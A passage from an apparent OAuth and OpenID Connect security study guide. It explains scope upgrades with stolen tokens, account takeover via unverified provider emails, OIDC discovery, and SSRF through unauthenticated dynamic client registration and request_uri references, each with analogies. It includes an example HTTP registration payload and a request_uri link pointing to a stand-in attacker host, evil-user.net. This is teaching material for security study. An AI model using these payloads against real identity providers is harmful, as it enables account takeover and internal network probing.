* **1. Stealing the Implicit Token:**
* The attacker intercepts a valid access token belonging to a victim as it passes through the browser during an implicit login flow.


* **2. Calling the User Info Endpoint:**
* The attacker sends a direct request to the OAuth server's `/userinfo` endpoint using the stolen token.


* **3. Manually Adding Extra Scopes:**
* During this request, the attacker manually appends a broader scope parameter (like `profile` or `contacts`) to see if the server will accept it.


* **4. Harvesting Unauthorized Data:**
* If the server fails to cross-check the scope against the original token generation record, it blindly returns the extra sensitive data to the attacker.



---

### 🎯 Plain-English Breakdown of the Attack

Think of this like finding a dropped visitor pass to a building lobby and trying to use it to sneak into the executive floor:

1. **Finding a Dropped Pass:** You pick up a visitor card that someone accidentally dropped on the sidewalk, giving you basic entry into the building's front lobby.
2. **Adding a Fake Sticky Note:** When you walk up to the elevator scanner, you take a pen and write "All Floors Access" on a sticky note attached to the card.
3. **The Lazy Security Scanner:** You swipe the card at the elevator gate. The digital reader accepts the card, ignores your handwritten sticky note, and fails to check your original visitor permission record.
4. **Riding to the Top:** The elevator doors open up, and you ride straight up to the top floor—accessing private areas you were never supposed to see!

### 🔐 Attack Style: Unverified User Registration & Account Takeover (The Fake Verified Email)

**The Goal:** Take over a victim's account on a target website by registering a fraudulent account with the OAuth provider using the victim's email address before the provider checks or verifies it.

---

### 🧩 Concept: Blindly Trusting Unverified Provider Data

* **The Dangerous Assumption:** When a website uses an external OAuth provider for logins, it blindly trusts that the provider has already verified the user's identity and email address.
* **The Unverified Provider Flaw:** Some OAuth providers allow people to sign up and create accounts without verifying their email addresses (e.g., letting you register with `victim@example.com` without proving you actually own that email).
* **Account Hijacking:** An attacker registers an account on the OAuth provider using a victim's known email address. When the attacker logs into the target website using that OAuth account, the website thinks the attacker *is* the victim, letting them walk right into the victim's account!

---

### 🛠️ How the Attack Works

* **1. Claiming the Victim's Email:**
* The attacker creates a new account on a weak OAuth provider, typing in a target victim's email address (e.g., `boss@company.com`) during registration.


* **2. Bypassing Verification:**
* Because the OAuth provider doesn't require email confirmation or click-to-verify links, the fake account becomes active immediately.


* **3. Logging into the Target Website:**
* The attacker goes to the client application website and clicks "Log in with OAuth," selecting the provider where they just set up the fraudulent account.


* **4. The Takeover:**
* The target website looks at the incoming data, sees the victim's email address, trusts the provider completely, and logs the attacker straight into the victim's pre-existing account!



---

### 🎯 Plain-English Breakdown of the Attack

Think of this like a membership club that accepts library cards from an outer town library with loose security rules:

1. **The Loose Local Library:** A small local town library lets anyone walk up and print out a library card under any name or email address they want, without ever checking a photo ID or sending a confirmation letter.
2. **Printing a Fake Card:** An attacker walks up to that library, claims to be the CEO of a major company, and gets a valid library card printed with the CEO's exact email address.
3. **The Exclusive Country Club:** A high-end country club has a rule: *"If you have a card from the local town library, you can walk right into our members-only lounge."*
4. **Walking Right In:** The attacker shows the fake library card at the country club door. The club staff blindly trusts the card, hands them the keys to the CEO's private locker, and lets the attacker take over!

### 🔐 Concept Style: OpenID Connect & Standardized Authentication (The Universal ID Badge)

**The Goal:** Refresh your understanding of how OpenID Connect (OIDC) builds an identity and authentication layer directly on top of standard OAuth to make website logins uniform and secure.

---

### 🧩 Concept: The Universal Login Layer

* **Fixing OAuth's Identity Gap:** OAuth was built for sharing file access (like photos), not for proving who you are. Developers used to build messy, custom login workarounds for every different provider.
* **The OIDC Upgrade:** OpenID Connect fixes this by adding a standardized identity layer. Every provider uses the exact same rules, endpoints, and scopes.
* **The Secure ID Token:** Instead of just getting a generic access token, OIDC gives the app an `id_token` filled with standardized user details called **claims** (such as `name`, `email`, or `birth_date`).

---

### 🛠️ How OpenID Connect Works

* **1. The Mandatory Scope:**
* Every OIDC request must include the `openid` scope, combined with optional standard scopes like `profile`, `email`, `address`, or `phone`.


* **2. Standardized Claims:**
* The server responds with universally recognized key-value pairs (claims) that tell the client application exactly who is logging in.


* **3. Unified Roles:**
* The terminology matches OAuth: the app is the **Relying Party**, the user is the **End User**, and the identity provider is the **OpenID Provider**.



---

### 🎯 Plain-English Breakdown of the Concept

Think of this like upgrading from messy club membership cards to a universal passport:

1. **The Old Way:** Every gym and restaurant required you to fill out unique paperwork and carry their own custom card just to prove you were a member.
2. **The Universal Passport (OIDC):** Governments introduced a standard passport format that every international hotel and airline instantly recognizes.
3. **The Standardized Stamps (Claims):** When you hand over your passport, the border agent reads your verified name and email address using a universal standard, letting you log in smoothly anywhere in the world!

### 🔐 Concept Style: The ID Token & JWT Cryptographic Identity (The Signed Digital Passport)

**The Goal:** Understand how OpenID Connect uses digitally signed JSON Web Tokens (`id_token`) to instantly deliver verified user identity details and authentication history in a single, secure step.

---

### 🧩 Concept: Getting Your Identity Signed and Delivered Instantly

* **The Instant Identity Package:** Instead of the old OAuth routine—where an app had to grab a token and then make a *separate* follow-up request to fetch user data—OIDC hands over an `id_token` immediately upon login.
* **What is an ID Token?** It is a **JSON Web Token (JWT)** packed with user details (claims) and wrapped in a cryptographic signature (JWS) to prove it hasn't been tampered with.
* **Built-In Performance & Security:** Because the identity data arrives instantly, it reduces network traffic and uses math (cryptographic signatures) instead of just trusting the network channel to protect against tampering.

---

### 🛠️ How ID Tokens Work

* **1. The JWT Payload & Claims:**
* The token contains standard claims about the user plus crucial metadata about *when* and *how* the user logged in, letting the app decide if the session is secure enough.


* **2. Cryptographic Integrity:**
* The token is digitally signed by the provider. While this stops casual tampering, attackers can sometimes target how keys are fetched if public signing keys are exposed (e.g., via `/.well-known/jwks.json`).


* **3. Combining Response Types:**
* Applications can request multiple items at once by mixing OIDC and OAuth response types in a single request:
* `response_type=id_token token`
* `response_type=id_token code`
* This forces the server to return an ID token alongside an access token or authorization code simultaneously.



---

### 🎯 Plain-English Breakdown of the Concept

Think of this like receiving an official, government-sealed envelope instead of a phone call:

1. **The Old Multi-Step Call:** In basic OAuth, the website had to call the central office twice—once to get a visitor badge, and a second time to ask for your background details over the phone.
2. **The Sealed Envelope (`id_token`):** With OIDC, the front desk hands you a sealed envelope right away containing your background check, neatly printed and stamped with an official, tamper-proof wax seal.
3. **Trusting the Wax Seal:** Instead of trusting whether the courier might have lied, the website checks the cryptographic wax seal. If the math checks out, the website instantly opens the envelope and lets you in without making any extra phone calls!

### 🔐 Concept Style: Identifying OpenID Connect (Spotting the Universal Passport)

**The Goal:** Learn how to detect whether a web application is using OpenID Connect (OIDC) by inspecting login requests, testing hidden parameters, or checking public configuration files.

---

### 🧩 Concept: How to Spot an OpenID Connect Implementation

* **The Mandatory Scope Clue:** The absolute easiest way to tell if an app is using OIDC is to look for the required `openid` scope in the login request.
* **Probing Hidden Support:** Even if a website looks like it is using basic, old-school OAuth, the underlying server might actually support OIDC. You can test this by manually injecting `openid` or changing the response type to `id_token` to see how the server reacts.
* **The Configuration Map:** OAuth and OIDC providers usually publish their entire blueprint of settings, endpoints, and rules at a standard public address for developers to read.

---

### 🛠️ How to Find and Test OIDC

* **1. Inspect the Authorization Request:**
* Check your traffic proxy or browser address bar during login to see if the `scope` parameter includes `openid`.


* **2. Force-Test OIDC Parameters:**
* If OIDC isn't explicitly visible, manually add `scope=openid` or change the response type to request an `id_token` to see if the server accepts it instead of throwing an error.


* **3. Check the Discovery Endpoint:**
* Look up the provider's public configuration file at the standard URL path:
* `/.well-known/openid-configuration`
* This file lists all supported endpoints, scopes, and signing keys.



---

### 🎯 Plain-English Breakdown of the Concept

Think of this like checking whether a high-security building accepts universal digital keycards instead of old paper tickets:

1. **Checking the Entrance Sign:** You walk up to the front desk and look at the required check-in rules to see if "Universal ID" (`openid`) is listed.
2. **Testing a Keycard Anyway:** Even if the sign only mentions paper tickets, you slide a digital keycard into the slot just to see if the door light turns green and lets you in.
3. **Reading the Building Directory:** You walk over to the public information kiosk at `/.well-known/openid-configuration` to read the official building directory, which explicitly lists all the electronic doors and passcodes supported inside!

### 🔐 Attack Style: Unprotected Dynamic Client Registration & SSRF (The Self-Registered Backdoor)

**The Goal:** Register a malicious client application directly with the OpenID provider without permission, and force the provider's server to ping arbitrary internal or external servers by feeding it malicious URL properties.

---

### 🧩 Concept: When Registration Desks Forget to Check ID

* **The Dynamic Registration Feature:** OpenID Connect provides a standardized way for apps to register themselves automatically by sending a `POST` request to a `/registration` endpoint.
* **The Missing Authentication Flaw:** Ideally, the provider should strictly verify who is registering (using a bearer token or admin key). If a server allows unauthenticated registration, anyone can walk up and create their own client application.
* **Second-Order SSRF Risk:** The registration payload contains fields that take URLs (like `logo_uri` or `jwks_uri`). If the provider blindly fetches these URLs later, attackers can abuse the server to scan internal networks or launch Server-Side Request Forgery (SSRF) attacks!

---

### 🛠️ How the Attack Works

* **1. Finding the Registration Endpoint:**
* The attacker looks at the public OIDC configuration file (`/.well-known/openid-configuration`) to find the dedicated `/registration` URL path.


* **2. Submitting a Malicious Registration:**
* The attacker sends an unauthenticated `POST` request to register their own app, injecting attacker-controlled endpoints or domains into the JSON body:


```http
POST /openid/register HTTP/1.1
Content-Type: application/json
Host: oauth-authorization-server.com

{
    "application_type": "web",
    "redirect_uris": [
        "https://evil-user.net/callback"
        ],
    "client_name": "Malicious App",
    "jwks_uri": "http://internal-network-service/secret"
}

```


* **3. Triggering Second-Order SSRF:**
* Later, when the OpenID provider's background services attempt to fetch the keys or logo from the provided URL, the server is tricked into making requests against internal network resources or external targets controlled by the attacker.



---

### 🎯 Plain-English Breakdown of the Attack

Think of this like an unattended security badge printer left out in the open lobby:

1. **The Unlocked Machine:** The office building sets up an automated electronic badge printer that is supposed to require an administrator key before printing official contractor passes.
2. **Skipping the Key:** Due to poor configuration, the printer accepts any registration request without checking for an admin pass.
3. **Printing a Fake Pass:** An outsider walks up, types in a fake company name, and lists an unauthorized return address.
4. **The Trapped Server:** When the central building management system later tries to mail a package or ping the URL listed on that fake registration record, it accidentally exposes internal corporate files or scans private company systems on behalf of the attacker!

### 🔐 Attack Style: Authorization Requests by Reference & JWT Validation Bypasses (The Remote Instruction Sheet)

**The Goal:** Bypass security filters and trick the server into launching Server-Side Request Forgery (SSRF) by replacing standard query parameters with a remote reference URL pointing to a malicious JSON Web Token (JWT).

---

### 🧩 Concept: Hiding Parameters Inside a Remote Package

* **The Query String Alternative:** Instead of sending regular OAuth parameters openly in the URL query string, some OpenID providers let you pass a single `request_uri` parameter that points to a remote JWT containing all the actual instructions.
* **The SSRF Vector:** Because the server has to make an outbound network request to fetch that remote JWT file from the URL you provide, it creates an instant opening for Server-Side Request Forgery (SSRF).
* **Validation Mismatch Traps:** Security filters often check query string parameters very strictly, but developers frequently forget to apply the exact same validation rules to parameters nested inside a downloaded JWT—allowing attackers to sneak past redirect URI blacklists.

---

### 🛠️ How the Attack Works

* **1. Checking for Support:**
* You look for `request_uri_parameter_supported` inside the `/.well-known/openid-configuration` file, or simply test by adding `request_uri=[https://evil-user.net/jwt](https://evil-user.net/jwt)` to see if the server processes it.


* **2. Crafting the Remote JWT:**
* The attacker hosts a signed JWT file on an external server they control, wrapping restricted parameters (like an unauthorized `redirect_uri`) inside the token body.


* **3. Forcing the Server to Fetch It:**
* The attacker sends a login request containing the reference link:
* `[https://oauth-authorization-server.com/auth?client_id=123&request_uri=https://evil-user.net/malicious.jwt](https://oauth-authorization-server.com/auth?client_id=123&request_uri=https://evil-user.net/malicious.jwt)`


* **4. Triggering SSRF & Bypassing Filters:**
* The provider's backend server reaches out to fetch the remote file (triggering SSRF), reads the hidden JWT parameters, fails to validate them properly, and blindly honors the restricted redirect address!



---

### 🎯 Plain-English Breakdown of the Attack

Think of this like submitting a building application using a remote web link instead of filling out the paper form at the front desk:

1. **The Remote Instruction Link:** Instead of handing the clerk a physical form with all your requested details written out, you hand them a slip of paper that says: *"Go read my instruction sheet posted on my personal website at this web address."*
2. **Making the Outbound Trip:** The clerk leaves the front desk and visits your website to download the document (triggering an SSRF network call).
3. **The Unchecked Secret Note:** While the front desk security scanner checks all paper forms dropped in the lobby, the clerk who fetched your remote link forgets to run security checks on the downloaded file.
4. **Sneaking Past the Rules:** Your remote document contains a forbidden address change. Because the clerk trusts the downloaded note without double-checking the rules, you successfully bypass the building's strict directory restrictions!
